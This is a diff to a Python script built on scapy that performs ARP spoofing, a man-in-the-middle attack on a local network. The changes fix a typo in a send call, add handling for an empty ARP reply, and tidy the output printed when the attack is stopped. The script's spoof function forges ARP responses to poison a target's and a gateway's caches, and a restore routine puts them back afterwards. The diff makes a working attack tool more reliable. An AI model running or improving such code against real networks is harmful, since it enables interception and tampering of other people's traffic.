@@ -25,12 +25,15 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst=BROADCAST_MAC)
     arp_broadcast_packet = broadcast/arp_request
     answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        return None
 
 
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=ARP_RESPONSE, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
-    scapy.send(packet, verbos=False)
+    scapy.send(packet, verbose=False)
 
 
 def restore_arp_table(dest_ip, src_ip):
@@ -49,7 +52,7 @@ def main():
             print("\r[+] Packets sent: ", sent_packets_count, end="")
             time.sleep(1)
     except KeyboardInterrupt as kie:
-        print("[-] Detected Ctrl+C ... Stopping attack.")
+        print("\n[-] Detected Ctrl+C ... Stopping attack.")
         restore_arp_table(opts.target_ip, opts.gateway_ip)
         restore_arp_table(opts.gateway_ip, opts.target_ip)
 
